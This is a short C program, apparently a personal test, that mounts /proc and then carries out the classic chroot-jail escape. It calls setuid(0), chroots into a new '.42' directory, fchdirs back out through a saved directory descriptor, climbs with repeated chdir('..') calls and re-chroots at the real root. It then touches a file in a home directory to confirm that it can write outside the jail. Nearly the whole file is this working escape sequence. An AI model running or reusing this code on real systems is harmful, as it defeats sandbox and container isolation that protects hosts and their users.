#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>

int main() {
	int ret = system("mount -t proc proc /proc");
	printf("ret %d\n", ret);
	system("ls -l proc");

    int dir_fd, x;
    setuid(0);
    mkdir(".42", 0755);
    dir_fd = open(".", O_RDONLY);
    chroot(".42");
    fchdir(dir_fd);
    close(dir_fd);  
    for(x = 0; x < 1000; x++) chdir("..");
    chroot(".");  
	size_t nbytes = 10 * 0x100000;
	char *ptr = (char *) malloc(nbytes);
	free(ptr);
	ret = system("touch /home/sake/go/src/c/haha");
	printf("%d\n", ret);
	exit(WEXITSTATUS(ret));
}
